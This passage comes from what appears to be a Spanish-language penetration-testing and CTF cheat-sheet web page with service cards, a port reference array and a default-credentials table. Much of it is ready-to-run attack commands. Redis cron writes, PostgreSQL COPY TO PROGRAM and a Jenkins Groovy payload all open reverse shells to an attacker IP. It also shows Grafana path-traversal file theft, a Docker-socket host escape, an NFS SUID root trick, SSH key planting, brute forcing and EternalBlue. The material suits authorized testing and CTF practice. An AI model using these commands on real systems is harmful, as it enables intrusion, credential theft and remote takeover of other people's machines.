          <div class="cs-section full"><h4>Escalación via cron</h4><ul><li><span class="cs-cmd">CONFIG SET dir /etc/cron.d</span></li><li><span class="cs-cmd">CONFIG SET dbfilename root</span></li><li><span class="cs-cmd">SET x "\n* * * * * root bash -i &gt;&amp; /dev/tcp/ip/4444 0&gt;&amp;1\n"</span></li><li><span class="cs-cmd">SAVE</span></li></ul></div>
          <div class="cs-cred-mini"><h4>Credenciales por defecto</h4>
            <div class="cs-cred-row"><span class="cs-cred-user">(ninguno)</span><span class="cs-cred-pass">(vacía)</span><span class="cs-cred-note">Sin auth por defecto</span></div>
          </div>
          <div class="cs-tip"><strong>Tip</strong>Genera tu SSH key con ssh-keygen -t rsa, copia id_rsa.pub y plántala en /root/.ssh/authorized_keys via Redis. Luego: ssh -i id_rsa root@ip</div>
        </div></div>
      </div>
      <div class="cs-card" id="db-postgresql">
        <div class="cs-card-header" onclick="toggleCard('db-postgresql')">
          <span class="cs-badge db">PostgreSQL</span>
          <div class="cs-header-text"><h3>PostgreSQL</h3><p>COPY TO PROGRAM = RCE si eres superusuario</p></div>
          <span class="cs-chevron">▾</span>
        </div>
        <div class="cs-body"><div class="cs-grid">
          <div class="cs-section"><h4>Enumeración</h4><ul><li><span class="cs-cmd">\l (listar bases de datos)</span></li><li><span class="cs-cmd">\dt (listar tablas)</span></li><li><span class="cs-cmd">SELECT usename,passwd FROM pg_shadow;</span></li></ul></div>
          <div class="cs-section"><h4>RCE</h4><ul><li><span class="cs-cmd">COPY (SELECT '') TO PROGRAM 'bash -i &gt;&amp; /dev/tcp/ip/4444 0&gt;&amp;1';</span></li><li><span class="cs-cmd">CREATE TABLE t(c text); COPY t FROM PROGRAM 'id';</span></li></ul></div>
          <div class="cs-section full"><h4>Conexión</h4><ul><li><span class="cs-cmd">psql -h ip -U postgres</span></li><li><span class="cs-cmd">hydra -l postgres -P rockyou.txt postgres://ip</span></li></ul></div>
          <div class="cs-cred-mini"><h4>Credenciales por defecto</h4>
            <div class="cs-cred-row"><span class="cs-cred-user">postgres</span><span class="cs-cred-pass">postgres</span><span class="cs-cred-note">Por defecto</span></div>
            <div class="cs-cred-row"><span class="cs-cred-user">postgres</span><span class="cs-cred-pass">(vacía)</span><span class="cs-cred-note">Acceso local</span></div>
          </div>
          <div class="cs-tip"><strong>Tip</strong>COPY TO PROGRAM ejecuta comandos del sistema. Necesitas ser superusuario. Verifica con: SELECT current_user;</div>
        </div></div>
      </div>
    </div>
  </div>

  <!-- ═══ DEVOPS ═══ -->
  <div class="cs-main-panel" id="panel-devops">
    <input class="cs-search" type="text" placeholder="Filtrar servicios DevOps..." oninput="filterCards('devops',this.value)">
    <div id="list-devops">
      <div class="cs-card" id="devops-jenkins">
        <div class="cs-card-header" onclick="toggleCard('devops-jenkins')">
          <span class="cs-badge devops">Jenkins</span>
          <div class="cs-header-text"><h3>Jenkins</h3><p>CI/CD. Consola Groovy en /script = RCE directo</p></div>
          <span class="cs-chevron">▾</span>
        </div>
        <div class="cs-body"><div class="cs-grid">
          <div class="cs-section"><h4>Rutas clave</h4><ul><li>/script (consola Groovy)</li><li>/credentials/</li><li>/configure</li><li>~/.jenkins/secrets/master.key</li></ul></div>
          <div class="cs-section"><h4>Vulnerabilidades</h4><ul><li><span class="cs-tag-vuln">Consola Groovy sin auth (RCE)</span></li><li><span class="cs-tag-vuln">CVE-2019-1003000</span></li><li><span class="cs-tag-vuln">Credenciales almacenadas</span></li></ul></div>
          <div class="cs-section full"><h4>RCE via Groovy</h4><ul><li><span class="cs-cmd">Thread.start{ "bash -i &gt;&amp; /dev/tcp/ip/4444 0&gt;&amp;1".execute() }</span></li><li><span class="cs-cmd">println "id".execute().text</span></li><li><span class="cs-cmd">println new File('/etc/passwd').text</span></li></ul></div>
          <div class="cs-cred-mini"><h4>Credenciales por defecto</h4>
            <div class="cs-cred-row"><span class="cs-cred-user">admin</span><span class="cs-cred-pass">admin</span><span class="cs-cred-note">Sin configurar</span></div>
            <div class="cs-cred-row"><span class="cs-cred-user">admin</span><span class="cs-cred-pass">password</span><span class="cs-cred-note">Común</span></div>
          </div>
          <div class="cs-tip"><strong>Tip</strong>Si /script está accesible sin auth, tienes RCE inmediato. Revisa también /credentials/ para credenciales guardadas de otros sistemas.</div>
        </div></div>
      </div>
      <div class="cs-card" id="devops-grafana">
        <div class="cs-card-header" onclick="toggleCard('devops-grafana')">
          <span class="cs-badge devops">Grafana</span>
          <div class="cs-header-text"><h3>Grafana</h3><p>Dashboards. CVE-2021-43798 LFI sin autenticación</p></div>
          <span class="cs-chevron">▾</span>
        </div>
        <div class="cs-body"><div class="cs-grid">
          <div class="cs-section"><h4>Rutas clave</h4><ul><li>/login (puerto 3000)</li><li>/api/datasources</li><li>/var/lib/grafana/grafana.db</li></ul></div>
          <div class="cs-section"><h4>Vulnerabilidades</h4><ul><li><span class="cs-tag-vuln">CVE-2021-43798 (LFI sin auth)</span></li><li><span class="cs-tag-vuln">Credenciales en datasources</span></li></ul></div>
          <div class="cs-section full"><h4>Comandos</h4><ul><li><span class="cs-cmd">curl http://ip:3000/public/plugins/alertlist/../../../../../../../../etc/passwd</span></li><li><span class="cs-cmd">curl http://ip:3000/public/plugins/alertlist/../../../../../../../var/lib/grafana/grafana.db -o grafana.db</span></li><li><span class="cs-cmd">sqlite3 grafana.db "select login,password from user;"</span></li></ul></div>
          <div class="cs-cred-mini"><h4>Credenciales por defecto</h4>
            <div class="cs-cred-row"><span class="cs-cred-user">admin</span><span class="cs-cred-pass">admin</span><span class="cs-cred-note">Por defecto</span></div>
          </div>
          <div class="cs-tip"><strong>Tip</strong>CVE-2021-43798 afecta versiones 8.0.0-8.3.0. Descarga grafana.db via LFI y extrae credenciales con sqlite3. Hasheadas con bcrypt.</div>
        </div></div>
      </div>
      <div class="cs-card" id="devops-gitea">
        <div class="cs-card-header" onclick="toggleCard('devops-gitea')">
          <span class="cs-badge devops">Gitea/GitLab</span>
          <div class="cs-header-text"><h3>Gitea / GitLab</h3><p>Repositorios git. Busca credenciales y código fuente</p></div>
          <span class="cs-chevron">▾</span>
        </div>
        <div class="cs-body"><div class="cs-grid">
          <div class="cs-section"><h4>Qué buscar</h4><ul><li>Credenciales hardcodeadas en repos</li><li>Archivos .env, config.php, settings.py</li><li>Historial de commits (git log)</li><li>SSH keys en repos</li></ul></div>
          <div class="cs-section"><h4>Vulnerabilidades</h4><ul><li><span class="cs-tag-vuln">CVE-2021-22205 GitLab RCE</span></li><li><span class="cs-tag-vuln">Registro público abierto</span></li><li><span class="cs-tag-vuln">Credenciales en commits</span></li></ul></div>
          <div class="cs-section full"><h4>Comandos</h4><ul><li><span class="cs-cmd">curl http://ip:3000/api/v1/repos/search</span></li><li><span class="cs-cmd">git log --all -p | grep -i password</span></li><li><span class="cs-cmd">trufflehog git http://ip/user/repo.git</span></li></ul></div>
          <div class="cs-cred-mini"><h4>Credenciales por defecto</h4>
            <div class="cs-cred-row"><span class="cs-cred-user">root</span><span class="cs-cred-pass">5iveL!fe</span><span class="cs-cred-note">GitLab versiones antiguas</span></div>
            <div class="cs-cred-row"><span class="cs-cred-user">admin</span><span class="cs-cred-pass">admin</span><span class="cs-cred-note">Gitea sin configurar</span></div>
          </div>
          <div class="cs-tip"><strong>Tip</strong>Revisa el historial completo: git log --all -p | grep -i password. Los devs a veces commitean credenciales y las borran, pero quedan en el historial.</div>
        </div></div>
      </div>
      <div class="cs-card" id="devops-portainer">
        <div class="cs-card-header" onclick="toggleCard('devops-portainer')">
          <span class="cs-badge devops">Docker</span>
          <div class="cs-header-text"><h3>Portainer / Docker</h3><p>Gestión de contenedores. Socket expuesto = escape</p></div>
          <span class="cs-chevron">▾</span>
        </div>
        <div class="cs-body"><div class="cs-grid">
          <div class="cs-section"><h4>Rutas clave</h4><ul><li>https://ip:9443 (Portainer)</li><li>/var/run/docker.sock</li><li>tcp://ip:2375 (API sin TLS)</li></ul></div>
          <div class="cs-section"><h4>Vulnerabilidades</h4><ul><li><span class="cs-tag-vuln">Docker socket expuesto</span></li><li><span class="cs-tag-vuln">Docker API sin TLS (2375)</span></li><li><span class="cs-tag-vuln">Escape de contenedor</span></li></ul></div>
          <div class="cs-section full"><h4>Escape via Docker socket</h4><ul><li><span class="cs-cmd">docker -H tcp://ip:2375 run -v /:/mnt --rm -it alpine chroot /mnt sh</span></li><li><span class="cs-cmd">curl --unix-socket /var/run/docker.sock http://localhost/images/json</span></li></ul></div>
          <div class="cs-cred-mini"><h4>Credenciales por defecto</h4>
            <div class="cs-cred-row"><span class="cs-cred-user">admin</span><span class="cs-cred-pass">admin</span><span class="cs-cred-note">Portainer sin configurar</span></div>
          </div>
          <div class="cs-tip"><strong>Tip</strong>Si el socket Docker está montado dentro del contenedor (/var/run/docker.sock), monta el filesystem del host completo en un nuevo contenedor para escapar.</div>
        </div></div>
      </div>
    </div>
  </div>

  <!-- ═══ RED / SMB ═══ -->
  <div class="cs-main-panel" id="panel-net">
    <input class="cs-search" type="text" placeholder="Filtrar servicios de red..." oninput="filterCards('net',this.value)">
    <div id="list-net">
      <div class="cs-card" id="net-smb">
        <div class="cs-card-header" onclick="toggleCard('net-smb')">
          <span class="cs-badge net">SMB</span>
          <div class="cs-header-text"><h3>SMB / Samba</h3><p>Compartición de archivos Windows. EternalBlue, enum4linux</p></div>
          <span class="cs-chevron">▾</span>
        </div>
        <div class="cs-body"><div class="cs-grid">
          <div class="cs-section"><h4>Enumeración</h4><ul><li><span class="cs-cmd">smbclient -L //ip -N</span></li><li><span class="cs-cmd">smbmap -H ip</span></li><li><span class="cs-cmd">enum4linux -a ip</span></li><li><span class="cs-cmd">crackmapexec smb ip</span></li></ul></div>
          <div class="cs-section"><h4>Vulnerabilidades</h4><ul><li><span class="cs-tag-vuln">EternalBlue MS17-010</span></li><li><span class="cs-tag-vuln">Pass-the-hash</span></li><li><span class="cs-tag-vuln">PrintNightmare</span></li><li><span class="cs-tag-vuln">Sesión nula</span></li></ul></div>
          <div class="cs-section full"><h4>Acceso y explotación</h4><ul><li><span class="cs-cmd">smbclient //ip/share -N</span></li><li><span class="cs-cmd">impacket-psexec user:pass@ip</span></li><li><span class="cs-cmd">nmap -p445 --script smb-vuln* ip</span></li><li><span class="cs-cmd">msfconsole: use exploit/windows/smb/ms17_010_eternalblue</span></li></ul></div>
          <div class="cs-tip"><strong>Tip</strong>Prueba sesión nula primero: smbclient -L //ip -N. EternalBlue es automático con Metasploit en Windows sin parchar.</div>
        </div></div>
      </div>
      <div class="cs-card" id="net-ldap">
        <div class="cs-card-header" onclick="toggleCard('net-ldap')">
          <span class="cs-badge net">LDAP/AD</span>
          <div class="cs-header-text"><h3>LDAP / Active Directory</h3><p>BloodHound para encontrar rutas de ataque en AD</p></div>
          <span class="cs-chevron">▾</span>
        </div>
        <div class="cs-body"><div class="cs-grid">
          <div class="cs-section"><h4>Enumeración LDAP</h4><ul><li><span class="cs-cmd">ldapsearch -x -H ldap://ip -b "dc=domain,dc=com"</span></li><li><span class="cs-cmd">ldapsearch -x -H ldap://ip -b "dc=domain,dc=com" "(objectClass=user)"</span></li></ul></div>
          <div class="cs-section"><h4>Ataques AD</h4><ul><li><span class="cs-cmd">impacket-GetNPUsers domain/ -no-pass -usersfile users.txt</span></li><li><span class="cs-cmd">impacket-GetUserSPNs domain/user:pass -outputfile hashes.txt</span></li><li><span class="cs-cmd">crackmapexec smb ip -u users.txt -p passwords.txt</span></li></ul></div>
          <div class="cs-section full"><h4>BloodHound</h4><ul><li><span class="cs-cmd">bloodhound-python -u user -p pass -d domain -ns ip -c all</span></li><li><span class="cs-cmd">impacket-GetADUsers domain/user:pass -all</span></li></ul></div>
          <div class="cs-tip"><strong>Tip</strong>Con BloodHound busca objetos con GenericAll, WriteDACL o AdminTo. ASREPRoast y Kerberoasting son los ataques más comunes en AD.</div>
        </div></div>
      </div>
      <div class="cs-card" id="net-snmp">
        <div class="cs-card-header" onclick="toggleCard('net-snmp')">
          <span class="cs-badge net">SNMP</span>
          <div class="cs-header-text"><h3>SNMP</h3><p>Enumera usuarios, procesos e interfaces. Community string: public</p></div>
          <span class="cs-chevron">▾</span>
        </div>
        <div class="cs-body"><div class="cs-grid">
          <div class="cs-section"><h4>Enumeración</h4><ul><li><span class="cs-cmd">snmpwalk -v2c -c public ip</span></li><li><span class="cs-cmd">snmp-check ip -c public</span></li><li><span class="cs-cmd">onesixtyone ip public</span></li></ul></div>
          <div class="cs-section"><h4>OIDs útiles</h4><ul><li>Procesos: 1.3.6.1.2.1.25.4.2.1.2</li><li>Usuarios: 1.3.6.1.4.1.77.1.2.25</li><li>Software: 1.3.6.1.2.1.25.6.3.1.2</li></ul></div>
          <div class="cs-section full"><h4>Brute force community strings</h4><ul><li><span class="cs-cmd">onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt ip</span></li></ul></div>
          <div class="cs-tip"><strong>Tip</strong>snmpwalk -v2c -c public ip revela usuarios del sistema, procesos, interfaces y software instalado. Prueba también "private" como community string.</div>
        </div></div>
      </div>
      <div class="cs-card" id="net-nfs">
        <div class="cs-card-header" onclick="toggleCard('net-nfs')">
          <span class="cs-badge net">NFS/Rsync</span>
          <div class="cs-header-text"><h3>NFS / Rsync</h3><p>Compartición de archivos Linux. Sin auth = acceso directo</p></div>
          <span class="cs-chevron">▾</span>
        </div>
        <div class="cs-body"><div class="cs-grid">
          <div class="cs-section"><h4>NFS</h4><ul><li><span class="cs-cmd">showmount -e ip</span></li><li><span class="cs-cmd">mount -t nfs ip:/share /mnt/nfs</span></li><li><span class="cs-cmd">nmap -p2049 --script nfs-showmount ip</span></li></ul></div>
          <div class="cs-section"><h4>Rsync</h4><ul><li><span class="cs-cmd">rsync rsync://ip/</span></li><li><span class="cs-cmd">rsync rsync://ip/share/ .</span></li><li><span class="cs-cmd">rsync -av shell rsync://ip/share/</span></li></ul></div>
          <div class="cs-section full"><h4>Escalación via NFS (no_root_squash)</h4><ul><li><span class="cs-cmd">cp /bin/bash /mnt/share/bash && chmod +s /mnt/share/bash</span></li><li><span class="cs-cmd">/mnt/share/bash -p (ejecutar en el objetivo)</span></li></ul></div>
          <div class="cs-tip"><strong>Tip</strong>Si NFS tiene no_root_squash, copia /bin/bash con SUID al share desde tu máquina y ejecútalo en el objetivo para obtener root.</div>
        </div></div>
      </div>
    </div>
  </div>

  <!-- ═══ CREDENCIALES ═══ -->
  <div class="cs-main-panel" id="panel-cred">
    <input class="cs-search" type="text" placeholder="Filtrar por servicio o credencial..." oninput="filterCreds(this.value)" style="margin-bottom:1rem">
    <div class="cs-card" style="overflow:auto">
      <table class="cs-cred-table">
        <thead><tr><th>Servicio</th><th>Usuario</th><th>Contraseña</th><th>Notas</th></tr></thead>
        <tbody id="cred-body"></tbody>
      </table>
    </div>
  </div>

</div>

<script>
const PORTS = [
  {port:21,name:'FTP',proto:'TCP',desc:'Transferencia de archivos. Transmite en texto plano sin cifrado.',services:['vsftpd','ProFTPD','FileZilla Server'],vulns:['Login anónimo habilitado','Credenciales por defecto','Bounce attack','FTP sin TLS (sniffing)'],tools:['nmap -sV -p21','ftp ip','hydra -l user -P pass.txt ftp://ip','metasploit: ftp_login'],tip:'Prueba siempre acceso anónimo: usuario anonymous, contraseña vacía o anonymous@.'},
  {port:22,name:'SSH',proto:'TCP',desc:'Acceso remoto cifrado a sistemas Linux/Unix.',services:['OpenSSH','Dropbear'],vulns:['Credenciales débiles','Versiones antiguas vulnerables','Claves privadas expuestas'],tools:['nmap -sV -p22','hydra -l user -P pass.txt ssh://ip','ssh-audit','medusa'],tip:'Si encuentras un id_rsa expuesto, prueba conectarte directamente. chmod 600 id_rsa.'},
  {port:23,name:'Telnet',proto:'TCP',desc:'Acceso remoto sin cifrado. Presente en dispositivos legacy y CTFs.',services:['Telnet server','BusyBox telnet'],vulns:['Tráfico en texto plano','Credenciales por defecto','Sin autenticación en algunos casos'],tools:['telnet ip 23','nmap -sV -p23','hydra -l user -P pass.txt telnet://ip'],tip:'En CTFs, Telnet frecuentemente no tiene contraseña o usa credenciales por defecto como admin/admin.'},
  {port:25,name:'SMTP',proto:'TCP',desc:'Envío de correo electrónico entre servidores.',services:['Postfix','Sendmail','Exim'],vulns:['Open relay','User enumeration (VRFY/EXPN)','Email spoofing'],tools:['nmap -p25 --script smtp-enum-users','smtp-user-enum','swaks','telnet ip 25'],tip:'Prueba VRFY y EXPN para enumerar usuarios. Un open relay permite enviar correo como cualquiera.'},
  {port:53,name:'DNS',proto:'TCP/UDP',desc:'Resolución de nombres de dominio. Crítico en reconocimiento.',services:['BIND','dnsmasq','Unbound'],vulns:['Zone transfer (AXFR)','DNS cache poisoning','Amplification DDoS'],tools:['dig axfr @ip dominio','nmap -sU -p53','dnsrecon','fierce','dnsenum'],tip:'Intenta un zone transfer: dig axfr @ip dominio. Si funciona, revela todos los subdominios.'},
  {port:80,name:'HTTP',proto:'TCP',desc:'Tráfico web sin cifrar. Primer puerto a revisar en CTFs.',services:['Apache','Nginx','IIS'],vulns:['SQLi','XSS','Directory traversal','LFI/RFI','Credenciales por defecto'],tools:['gobuster dir -u http://ip -w wordlist','nikto -h ip','burpsuite','ffuf'],tip:'Siempre haz fuzzing de directorios. Revisa /robots.txt, /.git/, /admin, /backup.'},
  {port:110,name:'POP3',proto:'TCP',desc:'Descarga de correos desde el servidor. Transmite en texto plano.',services:['Dovecot','Courier'],vulns:['Credenciales en texto plano','Brute force','User enumeration'],tools:['telnet ip 110','hydra -l user -P pass.txt pop3://ip','nmap -p110'],tip:'Conéctate con telnet: USER admin → PASS password → LIST para ver mensajes.'},
  {port:135,name:'RPC',proto:'TCP',desc:'Remote Procedure Call de Microsoft. Comunicación entre servicios Windows.',services:['Microsoft RPC','DCE/RPC'],vulns:['MS03-026 (RPC DCOM)','Enumeración de servicios','Relay attacks'],tools:['nmap -sV -p135','rpcclient -U "" ip','impacket-rpcdump'],tip:'rpcclient -U "" ip permite enumerar usuarios y shares sin credenciales en configuraciones débiles.'},
  {port:139,name:'NetBIOS',proto:'TCP',desc:'Compartición de archivos en redes Windows antiguas.',services:['Samba','Windows File Sharing'],vulns:['Enumeración de usuarios','MS08-067','Sesión nula'],tools:['enum4linux -a ip','nbtscan ip','nmap --script nbstat','smbclient'],tip:'Usa enum4linux para extraer usuarios, grupos y shares sin credenciales.'},
  {port:143,name:'IMAP',proto:'TCP',desc:'Acceso a correos en servidor. Más potente que POP3.',services:['Dovecot','Courier','Cyrus'],vulns:['Brute force','Credenciales débiles','Versiones vulnerables'],tools:['telnet ip 143','hydra -l user -P pass.txt imap://ip','nmap -p143'],tip:'LOGIN usuario pass → SELECT INBOX → FETCH 1 BODY[] para leer el primer correo.'},
  {port:161,name:'SNMP',proto:'UDP',desc:'Expone información del sistema y dispositivos de red.',services:['Net-SNMP','snmpd'],vulns:['Community string por defecto (public/private)','Enumeración de usuarios y procesos'],tools:['snmpwalk -v2c -c public ip','snmp-check ip','onesixtyone ip public'],tip:'snmpwalk -v2c -c public ip revela usuarios, procesos, interfaces y rutas. Prueba también "private".'},
  {port:389,name:'LDAP',proto:'TCP',desc:'Directorio de usuarios, grupos y equipos en Active Directory.',services:['OpenLDAP','Microsoft AD'],vulns:['Consultas anónimas habilitadas','Enumeración de usuarios','Password spray'],tools:['ldapsearch -x -H ldap://ip -b "dc=dominio,dc=com"','enum4linux -a ip','bloodhound'],tip:'ldapsearch -x -H ldap://ip -b "dc=dominio,dc=com" lista todos los objetos si las consultas anónimas están habilitadas.'},
  {port:443,name:'HTTPS',proto:'TCP',desc:'HTTP sobre TLS/SSL. Los certificados pueden revelar subdominios.',services:['Apache','Nginx','IIS'],vulns:['SQLi','XSS','Heartbleed','Certificados expirados'],tools:['gobuster dir -u https://ip -w wordlist','sslscan ip','nikto -h https://ip','burpsuite'],tip:'Revisa el certificado SSL: puede contener subdominios en el campo CN o SAN.'},
  {port:445,name:'SMB',proto:'TCP',desc:'Compartición de archivos en Windows. Objetivo frecuente en CTFs.',services:['Samba','Windows SMB'],vulns:['EternalBlue (MS17-010)','Pass-the-hash','Shares sin auth','PrintNightmare'],tools:['smbclient -L //ip','smbmap -H ip','crackmapexec smb ip','metasploit: ms17_010'],tip:'smbclient -L //ip -N lista shares sin contraseña. Busca shares con acceso de lectura/escritura.'},
  {port:636,name:'LDAPS',proto:'TCP',desc:'LDAP sobre SSL. Versión cifrada de LDAP para Active Directory.',services:['OpenLDAP','Microsoft AD'],vulns:['Enumeración de usuarios','Certificados autofirmados','Password spray'],tools:['ldapsearch -x -H ldaps://ip -b "dc=dominio,dc=com"','nmap -p636','bloodhound'],tip:'Igual que LDAP pero cifrado. Si LDAP (389) está bloqueado, prueba LDAPS (636).'},
  {port:873,name:'Rsync',proto:'TCP',desc:'Sincronización de archivos entre sistemas. Frecuentemente sin autenticación.',services:['rsync daemon'],vulns:['Acceso sin autenticación','Lectura/escritura de archivos sensibles','Escalación via authorized_keys'],tools:['rsync rsync://ip/','rsync rsync://ip/share /','nmap -p873 --script rsync-list-modules'],tip:'rsync rsync://ip/ lista los módulos disponibles. Si hay acceso de escritura, planta una SSH key en /root/.ssh/.'},
  {port:1433,name:'MSSQL',proto:'TCP',desc:'Microsoft SQL Server. Puede permitir ejecución de comandos del sistema.',services:['Microsoft SQL Server'],vulns:['Credenciales sa por defecto','xp_cmdshell (RCE)','Linked servers'],tools:['nmap -p1433 --script ms-sql-info','impacket-mssqlclient','sqsh'],tip:'Si accedes como sa, activa xp_cmdshell para ejecutar comandos del sistema operativo.'},
  {port:1521,name:'Oracle DB',proto:'TCP',desc:'Base de datos empresarial de Oracle.',services:['Oracle Database'],vulns:['Credenciales por defecto','TNS Poison','Privilege escalation'],tools:['nmap -p1521','odat','sqlplus','hydra -l user -P pass.txt oracle://ip'],tip:'Prueba credenciales por defecto: scott/tiger, sys/change_on_install, system/manager.'},
  {port:2049,name:'NFS',proto:'TCP/UDP',desc:'Compartición de archivos en sistemas Unix/Linux.',services:['NFS server','rpcbind'],vulns:['Shares sin autenticación','Escalación montando /root','Symlink attacks'],tools:['showmount -e ip','mount -t nfs ip:/share /mnt','nmap -p2049'],tip:'showmount -e ip muestra los shares. Móntalos y busca archivos sensibles como SSH keys.'},
  {port:2121,name:'FTP-Alt',proto:'TCP',desc:'Puerto FTP alternativo. Mismo protocolo que el 21 pero en puerto no estándar.',services:['vsftpd','ProFTPD','pyftpdlib'],vulns:['Login anónimo','Credenciales por defecto'],tools:['ftp ip 2121','nmap -sV -p2121','hydra -l user -P pass.txt -s 2121 ftp://ip'],tip:'Mismo enfoque que FTP en puerto 21. Prueba acceso anónimo primero.'},
  {port:3306,name:'MySQL',proto:'TCP',desc:'Base de datos relacional muy común en aplicaciones web.',services:['MySQL','MariaDB'],vulns:['Credenciales débiles','UDF injection (RCE)','Acceso remoto habilitado'],tools:['mysql -h ip -u root -p','nmap -p3306 --script mysql-info','hydra -l root -P pass.txt mysql://ip'],tip:'Prueba root sin contraseña: mysql -h ip -u root. Busca credenciales en las bases de datos.'},
  {port:3389,name:'RDP',proto:'TCP',desc:'Escritorio remoto de Windows. Acceso gráfico completo al sistema.',services:['Windows RDP','xrdp'],vulns:['BlueKeep (CVE-2019-0708)','Credenciales débiles','DejaBlue','Pass-the-hash'],tools:['xfreerdp /u:user /p:pass /v:ip','rdesktop ip','hydra -l user -P pass.txt rdp://ip'],tip:'Busca credenciales en otros servicios y pruébalas en RDP. Da acceso completo al escritorio.'},
  {port:4444,name:'Metasploit',proto:'TCP',desc:'Puerto por defecto del listener de Metasploit para reverse shells.',services:['Metasploit handler','nc listener'],vulns:['Listener expuesto accidentalmente','Backdoor activa'],tools:['nc -lvnp 4444','msfconsole: use multi/handler','nmap -sV -p4444'],tip:'Si está abierto en un CTF puede indicar un listener activo. Conéctate con nc ip 4444.'},
  {port:5432,name:'PostgreSQL',proto:'TCP',desc:'Base de datos relacional de código abierto muy potente.',services:['PostgreSQL'],vulns:['Credenciales débiles','COPY TO/FROM (RCE)','Extensiones maliciosas'],tools:['psql -h ip -U postgres','nmap -p5432','hydra -l postgres -P pass.txt postgres://ip'],tip:'Prueba postgres/postgres. COPY TO PROGRAM permite ejecución de comandos del sistema.'},
  {port:5985,name:'WinRM',proto:'TCP',desc:'Windows Remote Management. Ejecución remota de comandos PowerShell.',services:['WinRM','WSMan'],vulns:['Credenciales débiles','Pass-the-hash'],tools:['evil-winrm -i ip -u user -p pass','crackmapexec winrm ip -u user -p pass'],tip:'evil-winrm es la herramienta estándar para obtener una shell PowerShell con credenciales válidas.'},
  {port:6379,name:'Redis',proto:'TCP',desc:'Base de datos en memoria. Frecuentemente sin autenticación.',services:['Redis'],vulns:['Sin autenticación','Escritura de archivos arbitrarios','RCE via cron/SSH'],tools:['redis-cli -h ip','redis-cli -h ip CONFIG GET *','nmap -p6379'],tip:'CONFIG SET dir /root/.ssh → SET x "ssh-rsa ..." → SAVE para plantar una SSH key.'},
  {port:8080,name:'HTTP-Alt',proto:'TCP',desc:'Puerto HTTP alternativo. Servidores de desarrollo, proxies y apps Java.',services:['Tomcat','JBoss','Jenkins','Jetty'],vulns:['Credenciales por defecto en Tomcat','WAR malicioso','Panel admin expuesto'],tools:['gobuster dir -u http://ip:8080 -w wordlist','nikto -h ip:8080','burpsuite'],tip:'Tomcat /manager/html: prueba tomcat/tomcat, admin/admin. Si entras, sube un WAR con reverse shell.'},
  {port:8443,name:'HTTPS-Alt',proto:'TCP',desc:'Puerto HTTPS alternativo. Paneles de administración y Tomcat SSL.',services:['Tomcat SSL','Nginx','Paneles admin'],vulns:['Credenciales por defecto','Certificados autofirmados'],tools:['gobuster dir -u https://ip:8443 -w wordlist','sslscan ip:8443','nikto -h https://ip:8443'],tip:'Revisa el certificado y haz fuzzing. Paneles admin como pfSense y VMware usan este puerto.'},
  {port:9200,name:'Elasticsearch',proto:'TCP',desc:'Motor de búsqueda y análisis. Sin autenticación por defecto en versiones antiguas.',services:['Elasticsearch'],vulns:['Sin autenticación','Exposición masiva de datos','RCE via scripts (versiones antiguas)'],tools:['curl http://ip:9200','curl http://ip:9200/_cat/indices','nmap -p9200'],tip:'curl http://ip:9200/_cat/indices lista todos los índices. curl http://ip:9200/indice/_search muestra los datos.'},
  {port:11211,name:'Memcached',proto:'TCP/UDP',desc:'Sistema de caché en memoria. Sin autenticación por defecto.',services:['Memcached'],vulns:['Sin autenticación','Lectura de datos en caché','Amplification DDoS (UDP)'],tools:['nc ip 11211','nmap -p11211 --script memcached-info','echo "stats" | nc ip 11211'],tip:'echo "stats items" | nc ip 11211 lista los items. Puede contener sesiones, tokens o contraseñas.'},
  {port:27017,name:'MongoDB',proto:'TCP',desc:'Base de datos NoSQL de documentos JSON.',services:['MongoDB'],vulns:['Sin autenticación por defecto','Exposición a internet','NoSQL injection'],tools:['mongosh ip','mongo ip','nmap -p27017'],tip:'mongosh ip sin credenciales. show dbs → use db → db.users.find() para ver todos los datos.'},
];

const CREDS = [
  {s:'Tomcat',u:'tomcat',p:'tomcat',n:'Más común'},{s:'Tomcat',u:'admin',p:'admin',n:'Común'},{s:'Tomcat',u:'tomcat',p:'s3cret',n:'Documentación oficial'},
  {s:'Jenkins',u:'admin',p:'admin',n:'Sin configurar'},{s:'Jenkins',u:'admin',p:'password',n:'Común'},
  {s:'MySQL',u:'root',p:'',n:'Sin contraseña en instalaciones locales'},{s:'MySQL',u:'root',p:'root',n:'Muy común'},{s:'MySQL',u:'root',p:'mysql',n:'Instalaciones antiguas'},
  {s:'MSSQL',u:'sa',p:'',n:'Sin contraseña por defecto'},{s:'MSSQL',u:'sa',p:'sa',n:'Muy común'},{s:'MSSQL',u:'sa',p:'Password1',n:'Corporativo'},
  {s:'PostgreSQL',u:'postgres',p:'postgres',n:'Por defecto'},{s:'PostgreSQL',u:'postgres',p:'',n:'Sin contraseña en local'},
  {s:'phpMyAdmin',u:'root',p:'',n:'Acceso local sin pass'},{s:'phpMyAdmin',u:'phpmyadmin',p:'phpmyadmin',n:'Común'},
  {s:'WordPress',u:'admin',p:'admin',n:'Sin configurar'},{s:'WordPress',u:'admin',p:'password',n:'Muy común'},{s:'WordPress',u:'admin',p:'wordpress',n:'Común'},
  {s:'Drupal',u:'admin',p:'admin',n:'Por defecto'},{s:'Joomla',u:'admin',p:'admin',n:'Por defecto'},{s:'Magento',u:'admin',p:'admin123',n:'Por defecto'},
  {s:'FTP',u:'anonymous',p:'',n:'Acceso anónimo'},{s:'FTP',u:'anonymous',p:'anonymous',n:'Acceso anónimo'},{s:'FTP',u:'ftp',p:'ftp',n:'Usuarios por defecto'},
  {s:'Telnet',u:'admin',p:'admin',n:'Dispositivos de red'},{s:'Telnet',u:'root',p:'root',n:'Linux sin configurar'},{s:'Telnet',u:'root',p:'',n:'Sin contraseña en CTFs'},
  {s:'SSH',u:'root',p:'root',n:'Sin configurar'},{s:'SSH',u:'admin',p:'admin',n:'Dispositivos de red'},
  {s:'RDP',u:'Administrator',p:'Administrator',n:'Windows sin configurar'},{s:'RDP',u:'Administrator',p:'Password1',n:'Política común'},
  {s:'Oracle DB',u:'scott',p:'tiger',n:'Usuario demo clásico'},{s:'Oracle DB',u:'sys',p:'change_on_install',n:'Usuario sistema'},{s:'Oracle DB',u:'system',p:'manager',n:'Usuario sistema'},
  {s:'MongoDB',u:'',p:'',n:'Sin auth por defecto'},{s:'Redis',u:'',p:'',n:'Sin auth por defecto'},
  {s:'Elasticsearch',u:'elastic',p:'changeme',n:'Con X-Pack'},{s:'Elasticsearch',u:'',p:'',n:'Sin auth en versiones antiguas'},
  {s:'WinRM',u:'Administrator',p:'Administrator',n:'Sin configurar'},
